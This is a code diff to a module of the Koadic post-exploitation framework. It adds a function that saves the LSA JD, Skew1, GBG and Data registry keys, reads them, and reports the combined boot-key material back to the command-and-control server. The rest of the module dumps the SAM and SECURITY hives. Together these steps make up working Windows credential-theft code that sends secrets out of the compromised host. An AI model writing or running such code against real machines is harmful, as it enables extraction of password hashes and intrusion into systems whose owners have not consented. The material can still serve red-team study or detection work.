@@ -1,3 +1,29 @@
+function GetSysKey()
+{
+    var jdpath = Koadic.file.getPath("~RPATH~\\42JD");
+    var skew1path = Koadic.file.getPath("~RPATH~\\42Skew1");
+    var gbgpath = Koadic.file.getPath("~RPATH~\\42GBG");
+    var datapath = Koadic.file.getPath("~RPATH~\\42Data");
+
+    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD" + " " + jdpath + " /y", false);
+    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1" + " " + skew1path + " /y", false);
+    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG" + " " + gbgpath + " /y", false);
+    Koadic.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);
+
+    var data = Koadic.file.readBinary(jdpath);
+    data += Koadic.file.readBinary(skew1path);
+    data += Koadic.file.readBinary(gbgpath);
+    data += Koadic.file.readBinary(datapath);
+
+    data = data.replace(/\\/g, "\\\\");
+    data = data.replace(/\0/g, "\\0");
+
+    var headers = {};
+    headers["Task"] = "SysKey";
+
+    Koadic.work.report(data, headers);
+}
+
 function DumpHive(name, uuid)
 {
     var path = Koadic.file.getPath("~RPATH~\\" + uuid);
@@ -21,10 +47,7 @@ try
 {
     DumpHive("SAM", "42SAM");
     DumpHive("SECURITY", "42SECURITY");
-    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD", "42JD")
-    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1", "42Skew1")
-    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG", "42GBG")
-    DumpHive("SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data", "42Data")
+    GetSysKey();
     // DumpHive("SYSTEM", "42SYSTEM");
 
     Koadic.work.report("Complete");
